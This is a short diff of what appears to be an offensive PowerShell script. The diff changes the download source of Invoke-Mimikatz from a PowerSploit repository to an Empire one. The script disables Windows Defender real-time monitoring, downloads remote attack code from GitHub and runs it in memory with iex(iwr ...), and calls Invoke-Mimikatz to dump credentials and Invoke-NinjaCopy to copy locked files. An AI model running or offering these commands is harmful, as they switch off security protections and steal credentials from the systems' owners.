@@ -1,7 +1,7 @@
 Set-MPPreference -DisableRealtimeMonitoring $true
 
 ############# admin privs required
-iex( iwr https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f650520c4b1004daf8b3ec08007a0b945b91253a/Exfiltration/Invoke-Mimikatz.ps1 -usebasicparsing)
+iex( iwr https://raw.githubusercontent.com/EmpireProject/Empire/7efb7eeaabeb3daf916ead7856bb621bbca331f4/data/module_source/credentials/Invoke-Mimikatz.ps1 -usebasicparsing)
 Invoke-Mimikatz
 
 iex( iwr https://raw.githubusercontent.com/clr2of8/PowerSploit/master/Exfiltration/Invoke-NinjaCopy.ps1 -usebasicparsing)
